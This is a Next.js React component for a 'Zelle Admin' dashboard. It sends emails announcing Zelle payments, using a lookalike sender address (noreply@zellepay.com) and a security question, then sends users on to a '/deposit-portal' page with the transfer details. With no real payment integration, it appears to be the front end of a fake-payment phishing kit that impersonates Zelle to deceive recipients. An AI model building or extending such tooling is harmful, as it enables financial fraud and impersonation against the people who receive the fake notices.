"use client"

import type React from "react"
import { useState } from "react"
import { Send, DollarSign, Mail, User, ArrowRight, CheckCircle, AlertCircle, Clock, Eye } from "lucide-react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Textarea } from "@/components/ui/textarea"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
import { useRouter } from "next/navigation"

interface TransferStatus {
  id: string
  recipient: string
  recipientName: string
  amount: number
  status: "pending" | "sent" | "failed"
  timestamp: string
  message?: string
  securityQuestion?: string
}

export default function AdminDashboard() {
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [submitStatus, setSubmitStatus] = useState<{
    type: "success" | "error" | null
    message: string
  }>({ type: null, message: "" })

  const [formData, setFormData] = useState({
    recipientEmail: "",
    recipientName: "",
    amount: "",
    message: "",
    securityQuestion: "",
    securityAnswer: "",
    bankName: "Banking System",
    institutionCode: "000",
    branchCode: "00000",
    reference: "",
  })

  const [recentTransfers, setRecentTransfers] = useState<TransferStatus[]>([])
  const [previewTransfer, setPreviewTransfer] = useState<TransferStatus | null>(null)
  const [showPendingTransfers, setShowPendingTransfers] = useState(false)
  const router = useRouter()

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)
    setSubmitStatus({ type: null, message: "" })

    try {
      const reference = formData.reference || `ZELLE-${Date.now().toString().slice(-6)}`

      const response = await fetch("/api/send-zelle", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          ...formData,
          reference,
          senderEmail:
            typeof window !== "undefined"
              ? process.env.NEXT_PUBLIC_SENDER_EMAIL || "noreply@zellepay.com"
              : "noreply@zellepay.com",
          appUrl: typeof window !== "undefined" ? process.env.NEXT_PUBLIC_APP_URL || window.location.origin : "",
        }),
      })

      const data = await response.json()

      if (!response.ok) {
        throw new Error(data.error || "Failed to send Zelle payment")
      }

      const newTransfer: TransferStatus = {
        id: reference,
        recipient: formData.recipientEmail,
        recipientName: formData.recipientName,
        amount: Number.parseFloat(formData.amount),
        status: "sent",
        timestamp: new Date().toISOString(),
        message: formData.message,
        securityQuestion: formData.securityQuestion,
      }
      setRecentTransfers([newTransfer, ...recentTransfers])

      setSubmitStatus({
        type: "success",
        message: `Zelle payment of $${formData.amount} USD successfully sent to ${formData.recipientEmail}`,
      })

      setTimeout(() => {
        const transferParams = new URLSearchParams({
          transferId: reference,
          amount: formData.amount,
          recipient: formData.recipientEmail,
          recipientName: formData.recipientName,
          bankName: formData.bankName,
          message: formData.message || "",
          timestamp: new Date().toISOString(),
        })
        router.push(`/deposit-portal?${transferParams.toString()}`)
      }, 2000)

      setFormData({
        recipientEmail: "",
        recipientName: "",
        amount: "",
        message: "",
        securityQuestion: "",
        securityAnswer: "",
        bankName: "Banking System",
        institutionCode: "000",
        branchCode: "00000",
        reference: "",
      })
    } catch (error) {
      setSubmitStatus({
        type: "error",
        message: error instanceof Error ? error.message : "Failed to send Zelle payment",
      })
    } finally {
      setIsSubmitting(false)
    }
  }

  const formatTimestamp = (timestamp: string) => {
    const date = new Date(timestamp)
    return date.toLocaleString("en-US", {
      month: "short",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    })
  }

  return (
    <div className="min-h-screen bg-zinc-950">
      {/* Header */}
      <header className="border-b border-zinc-800 bg-zinc-900/80 backdrop-blur-sm">
        <div className="container mx-auto px-4 py-4 md:py-5 max-w-7xl">
          <div className="flex items-center justify-between gap-3">
            <div className="flex items-center gap-3">
              <div className="w-11 h-11 bg-[#6D1ED4] rounded-xl flex items-center justify-center shadow-lg shadow-[#6D1ED4]/30">
                <span className="text-white font-black text-2xl leading-none">Z</span>
              </div>
              <div>
                <h1 className="text-xl font-bold text-white">Zelle Admin</h1>
                <p className="text-xs text-zinc-500">Payment Management Dashboard</p>
              </div>
            </div>
            <button
              onClick={() => setShowPendingTransfers(true)}
              className="flex items-center gap-2 px-4 py-2 bg-zinc-800 border border-zinc-700 text-zinc-300 hover:text-white hover:border-zinc-600 rounded-xl font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-[#6D1ED4] text-sm"
            >
              <Clock className="w-4 h-4" />
              <span>Pending</span>
              {recentTransfers.filter((t) => t.status === "pending").length > 0 && (
                <span className="ml-1 px-2 py-0.5 bg-[#6D1ED4] text-white text-xs font-bold rounded-full">
                  {recentTransfers.filter((t) => t.status === "pending").length}
                </span>
              )}
            </button>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8 max-w-7xl">
        <div className="grid lg:grid-cols-3 gap-6">
          {/* Transfer Form */}
          <div className="lg:col-span-2">
            <Card className="bg-zinc-900 border-zinc-800">
              <CardHeader>
                <CardTitle className="text-xl flex items-center gap-2 text-white">
                  <Send className="w-5 h-5 text-[#6D1ED4]" />
                  Send Zelle Payment
                </CardTitle>
                <CardDescription className="text-zinc-500">Send secure money transfers via email</CardDescription>
              </CardHeader>
              <CardContent>
                <form onSubmit={handleSubmit} className="space-y-6">
                  {/* Recipient Information */}
                  <div className="space-y-4 p-5 bg-zinc-800/50 rounded-xl border border-zinc-700/50">
                    <h3 className="font-semibold text-sm text-zinc-300 flex items-center gap-2">
                      <User className="w-4 h-4 text-[#6D1ED4]" />
                      Recipient Information
                    </h3>

                    <div className="grid md:grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <Label htmlFor="recipientEmail" className="text-zinc-400 text-xs flex items-center gap-2">
                          <Mail className="w-3.5 h-3.5 text-[#6D1ED4]" />
                          Email Address <span className="text-red-400">*</span>
                        </Label>
                        <Input
                          id="recipientEmail"
                          type="email"
                          placeholder="recipient@example.com"
                          value={formData.recipientEmail}
                          onChange={(e) => setFormData({ ...formData, recipientEmail: e.target.value })}
                          className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4]"
                          required
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="recipientName" className="text-zinc-400 text-xs">
                          Recipient Name <span className="text-red-400">*</span>
                        </Label>
                        <Input
                          id="recipientName"
                          type="text"
                          placeholder="John Doe"
                          value={formData.recipientName}
                          onChange={(e) => setFormData({ ...formData, recipientName: e.target.value })}
                          className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4]"
                          required
                        />
                      </div>
                    </div>
                  </div>

                  {/* Transfer Details */}
                  <div className="space-y-4 p-5 bg-zinc-800/50 rounded-xl border border-zinc-700/50">
                    <h3 className="font-semibold text-sm text-zinc-300 flex items-center gap-2">
                      <DollarSign className="w-4 h-4 text-[#6D1ED4]" />
                      Transfer Details
                    </h3>

                    <div className="grid md:grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <Label htmlFor="amount" className="text-zinc-400 text-xs">
                          Amount (USD) <span className="text-red-400">*</span>
                        </Label>
                        <Input
                          id="amount"
                          type="number"
                          step="0.01"
                          min="0.01"
                          placeholder="100.00"
                          value={formData.amount}
                          onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
                          className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4] font-semibold"
                          required
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="reference" className="text-zinc-400 text-xs">Reference Number</Label>
                        <Input
                          id="reference"
                          type="text"
                          placeholder="Auto-generated"
                          value={formData.reference}
                          onChange={(e) => setFormData({ ...formData, reference: e.target.value })}
                          className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4] font-mono"
                        />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="message" className="text-zinc-400 text-xs">Message (Optional)</Label>
                      <Textarea
                        id="message"
                        placeholder="Add a message for the recipient..."
                        value={formData.message}
                        onChange={(e) => setFormData({ ...formData, message: e.target.value })}
                        className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4] min-h-[80px] resize-none"
                        maxLength={200}
                      />
                      <p className="text-xs text-zinc-600">{formData.message.length}/200 characters</p>
                    </div>

                    {/* Bank Information */}
                    <div className="grid md:grid-cols-3 gap-4 pt-1">
                      <div className="space-y-2">
                        <Label htmlFor="bankName" className="text-zinc-400 text-xs">Bank Name</Label>
                        <Input
                          id="bankName"
                          type="text"
                          placeholder="Banking System"
                          value={formData.bankName}
                          onChange={(e) => setFormData({ ...formData, bankName: e.target.value })}
                          className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4]"
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="institutionCode" className="text-zinc-400 text-xs">Institution Code</Label>
                        <Input
                          id="institutionCode"
                          type="text"
                          placeholder="000"
                          value={formData.institutionCode}
                          onChange={(e) => setFormData({ ...formData, institutionCode: e.target.value })}
                          className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4] font-mono"
                          maxLength={3}
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="branchCode" className="text-zinc-400 text-xs">Branch Code</Label>
                        <Input
                          id="branchCode"
                          type="text"
                          placeholder="00000"
                          value={formData.branchCode}
                          onChange={(e) => setFormData({ ...formData, branchCode: e.target.value })}
                          className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4] font-mono"
                          maxLength={5}
                        />
                      </div>
                    </div>
                  </div>

                  {/* Security */}
                  <div className="space-y-4 p-5 bg-zinc-800/50 rounded-xl border border-zinc-700/50">
                    <h3 className="font-semibold text-sm text-zinc-300">Security Question &amp; Answer</h3>

                    <div className="space-y-2">
                      <Label htmlFor="securityQuestion" className="text-zinc-400 text-xs">
                        Security Question <span className="text-red-400">*</span>
                      </Label>
                      <Input
                        id="securityQuestion"
                        type="text"
                        placeholder="e.g., What is your favorite color?"
                        value={formData.securityQuestion}
                        onChange={(e) => setFormData({ ...formData, securityQuestion: e.target.value })}
                        className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4]"
                        required
                      />
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="securityAnswer" className="text-zinc-400 text-xs">
                        Security Answer <span className="text-red-400">*</span>
                      </Label>
                      <Input
                        id="securityAnswer"
                        type="text"
                        placeholder="Enter the answer"
                        value={formData.securityAnswer}
                        onChange={(e) => setFormData({ ...formData, securityAnswer: e.target.value })}
                        className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4]"
                        required
                      />
                      <p className="text-xs text-zinc-600">
                        The recipient will need this answer to accept the transfer
                      </p>
                    </div>
                  </div>

                  {/* Status Messages */}
                  {submitStatus.type && (
                    <div
                      className={`p-4 rounded-xl border flex items-start gap-3 ${
                        submitStatus.type === "success"
                          ? "bg-green-950/50 border-green-900/50"
                          : "bg-red-950/50 border-red-900/50"
                      }`}
                    >
                      {submitStatus.type === "success" ? (
                        <CheckCircle className="w-5 h-5 text-green-400 flex-shrink-0 mt-0.5" />
                      ) : (
                        <AlertCircle className="w-5 h-5 text-red-400 flex-shrink-0 mt-0.5" />
                      )}
                      <p className={`text-sm font-medium ${
                        submitStatus.type === "success" ? "text-green-400" : "text-red-400"
                      }`}>
                        {submitStatus.message}
                      </p>
                    </div>
                  )}

                  {/* Submit Button */}
                  <Button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full bg-[#6D1ED4] hover:bg-[#5A18B0] text-white text-base py-6 font-bold"
                    size="lg"
                  >
                    {isSubmitting ? (
                      <>
                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                        <span>Sending...</span>
                      </>
                    ) : (
                      <>
                        <Send className="w-5 h-5" />
                        <span>Send Zelle Payment</span>
                        <ArrowRight className="w-5 h-5" />
                      </>
                    )}
                  </Button>
                </form>
              </CardContent>
            </Card>
          </div>

          {/* Recent Transfers Sidebar */}
          <div className="lg:col-span-1">
            <Card className="bg-zinc-900 border-zinc-800">
              <CardHeader>
                <CardTitle className="text-base flex items-center gap-2 text-white">
                  <Clock className="w-4 h-4 text-[#6D1ED4]" />
                  Recent Transfers
                </CardTitle>
                <CardDescription className="text-zinc-500">Last 10 transactions</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  {recentTransfers.length === 0 ? (
                    <p className="text-sm text-zinc-600 text-center py-8">No recent transfers</p>
                  ) : (
                    recentTransfers.map((transfer) => (
                      <div
                        key={transfer.id}
                        className="p-4 rounded-xl border border-zinc-800 bg-zinc-800/50 hover:border-zinc-700 transition-colors cursor-pointer group"
                        onClick={() => setPreviewTransfer(transfer)}
                      >
                        <div className="flex items-start justify-between mb-2">
                          <div className="flex-1 min-w-0">
                            <p className="font-semibold text-sm text-white truncate">{transfer.recipientName}</p>
                            <p className="text-xs text-zinc-500 truncate">{transfer.recipient}</p>
                            <p className="text-xs text-zinc-600">{formatTimestamp(transfer.timestamp)}</p>
                          </div>
                          <div className="flex items-center gap-2">
                            <Eye className="w-4 h-4 text-[#6D1ED4] opacity-0 group-hover:opacity-100 transition-opacity" />
                            <div
                              className={`px-2 py-1 rounded text-xs font-medium ${
                                transfer.status === "sent"
                                  ? "bg-green-500/10 text-green-400"
                                  : transfer.status === "pending"
                                    ? "bg-yellow-500/10 text-yellow-400"
                                    : "bg-red-500/10 text-red-400"
                              }`}
                            >
                              {transfer.status}
                            </div>
                          </div>
                        </div>
                        <div className="flex items-center justify-between">
                          <span className="text-base font-bold text-[#6D1ED4]">${transfer.amount.toFixed(2)} USD</span>
                          <span className="text-xs text-zinc-600 font-mono">{transfer.id}</span>
                        </div>
                      </div>
                    ))
                  )}
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </main>

      {/* Transfer Detail Modal */}
      <Dialog open={previewTransfer !== null} onOpenChange={() => setPreviewTransfer(null)}>
        <DialogContent className="max-w-xl max-h-[90vh] overflow-y-auto bg-zinc-900 border-zinc-800 text-white">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 text-white">
              <Mail className="w-5 h-5 text-[#6D1ED4]" />
              Transaction Details — {previewTransfer?.id}
            </DialogTitle>
          </DialogHeader>

          {previewTransfer && (
            <div className="space-y-5 mt-2">
              <div className="bg-zinc-800/60 rounded-xl border border-zinc-700 p-5 space-y-5">
                <div className="flex items-center justify-between pb-4 border-b border-zinc-700">
                  <h3 className="text-base font-semibold text-white">Transfer Summary</h3>
                  <span className="px-3 py-1 rounded-full text-xs font-medium bg-green-500/10 text-green-400 border border-green-500/20">
                    {previewTransfer.status.toUpperCase()}
                  </span>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                  <div className="space-y-1">
                    <p className="text-xs text-zinc-500">Amount</p>
                    <p className="text-xl font-bold text-white">${previewTransfer.amount.toFixed(2)} USD</p>
                  </div>

                  <div className="space-y-1">
                    <p className="text-xs text-zinc-500">Reference</p>
                    <p className="text-sm font-mono text-white">{previewTransfer.id}</p>
                  </div>

                  <div className="space-y-1">
                    <p className="text-xs text-zinc-500">Recipient</p>
                    <p className="text-sm text-white">{previewTransfer.recipientName}</p>
                    <p className="text-xs text-zinc-400">{previewTransfer.recipient}</p>
                  </div>

                  <div className="space-y-1">
                    <p className="text-xs text-zinc-500">Bank</p>
                    <p className="text-sm text-white">{formData.bankName}</p>
                    <p className="text-xs text-zinc-400">
                      {formData.institutionCode}-{formData.branchCode}
                    </p>
                  </div>

                  {previewTransfer.message && (
                    <div className="space-y-1 md:col-span-2">
                      <p className="text-xs text-zinc-500">Memo</p>
                      <p className="text-sm text-white">{previewTransfer.message}</p>
                    </div>
                  )}

                  <div className="space-y-1 md:col-span-2">
                    <p className="text-xs text-zinc-500">Timestamp</p>
                    <p className="text-xs font-mono text-zinc-400">
                      {new Date(previewTransfer.timestamp).toLocaleString()}
                    </p>
                  </div>
                </div>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* Pending Transfers Modal */}
      <Dialog open={showPendingTransfers} onOpenChange={setShowPendingTransfers}>
        <DialogContent className="max-w-2xl max-h-[90vh] overflow-y-auto bg-zinc-900 border-zinc-800 text-white">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 text-white">
              <Clock className="w-5 h-5 text-[#6D1ED4]" />
              Pending Transfers
            </DialogTitle>
            <DialogDescription className="text-zinc-500">
              {recentTransfers.filter((t) => t.status === "pending").length} pending transfer(s)
            </DialogDescription>
          </DialogHeader>

          <div className="space-y-3 mt-4">
            {recentTransfers.filter((t) => t.status === "pending").length === 0 ? (
              <p className="text-sm text-zinc-600 text-center py-8">No pending transfers</p>
            ) : (
              recentTransfers
                .filter((t) => t.status === "pending")
                .map((transfer) => (
                  <div
                    key={transfer.id}
                    className="p-4 rounded-xl border border-zinc-800 bg-zinc-800/50 hover:border-zinc-700 transition-colors cursor-pointer group"
                    onClick={() => {
                      setPreviewTransfer(transfer)
                      setShowPendingTransfers(false)
                    }}
                  >
                    <div className="flex items-start justify-between mb-2">
                      <div className="flex-1 min-w-0">
                        <p className="font-semibold text-sm text-white truncate">{transfer.recipientName}</p>
                        <p className="text-xs text-zinc-500 truncate">{transfer.recipient}</p>
                        <p className="text-xs text-zinc-600">{formatTimestamp(transfer.timestamp)}</p>
                      </div>
                      <div className="flex items-center gap-2">
                        <Eye className="w-4 h-4 text-[#6D1ED4] opacity-0 group-hover:opacity-100 transition-opacity" />
                        <div className="px-2 py-1 rounded text-xs font-medium bg-yellow-500/10 text-yellow-400">
                          pending
                        </div>
                      </div>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-base font-bold text-[#6D1ED4]">${transfer.amount.toFixed(2)} USD</span>
                      <span className="text-xs text-zinc-600 font-mono">{transfer.id}</span>
                    </div>
                  </div>
                ))
            )}
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}
